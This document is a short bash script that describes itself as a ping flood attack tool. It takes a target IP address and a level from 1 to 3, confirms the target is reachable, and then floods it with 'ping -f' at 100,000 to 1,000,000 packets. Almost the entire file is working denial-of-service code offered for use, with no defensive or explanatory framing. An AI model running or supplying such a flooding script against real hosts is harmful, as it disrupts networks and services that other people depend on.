#!/bin/bash

# Check if the target IP is provided
if [ $# -lt 2 ]; then
    echo "Usage: $0 <Target IP> -n <level>"
    echo "Levels: 1 = Low, 2 = Medium, 3 = High"
    exit 1
fi

# Target IP address
TARGET=$1

# Read the intensity level
LEVEL=$3

# Connectivity check
ping -c 1 $TARGET > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "Unable to reach the target: $TARGET"
    exit 2
fi

# Define the number of pings based on the level
case $LEVEL in
    1)
        PING_COUNT=100000  # Low level
        ;;
    2)
        PING_COUNT=500000  # Medium level
        ;;
    3)
        PING_COUNT=1000000  # High level
        ;;
    *)
        echo "Invalid level. Use 1, 2, or 3."
        exit 3
        ;;
esac

# Start the Ping Flood attack with the selected level
echo "Starting Ping Flood attack on $TARGET with $PING_COUNT packets..."
ping -f -c $PING_COUNT $TARGET

echo "Attack complete."
